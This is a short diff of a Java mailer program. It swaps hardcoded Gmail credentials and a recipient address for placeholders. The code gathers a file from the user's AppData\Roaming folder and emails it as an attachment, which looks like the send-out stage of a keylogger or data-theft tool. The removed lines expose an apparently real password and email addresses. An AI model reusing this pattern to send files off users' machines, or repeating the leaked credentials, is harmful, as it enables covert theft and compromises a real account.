@@ -24,8 +24,8 @@ public class MailerApp {
 	public static void main(String args[]) throws Exception {
 
 		InputStreamReader cin = null;
-		final String password = "143vinay143";
-		final String username = "addanki.vinay40";
+		final String password = "password";
+		final String username = "your_mailId";
 		final String SSL_FACTORY = "javax.net.ssl.SSLSocketFactory";
 		String location = System.getenv("SystemDrive") + System.getenv("HOMEPATH") + "\\AppData\\" + "Roaming\\";
 		Properties props = System.getProperties();
@@ -53,7 +53,7 @@ public class MailerApp {
 				multipart.addBodyPart(attachmentPart);
 				Message msg = new MimeMessage(session);
 				msg.setFrom(new InternetAddress(username + "@gmail.com"));
-				msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse("vinay.addanki540@gmail.com", false));
+				msg.setRecipients(Message.RecipientType.TO, InternetAddress.parse("recived_mailId@gmail.com", false));
 				msg.setSubject("Hello");
 				msg.setContent(multipart);
 				msg.setSentDate(new Date());
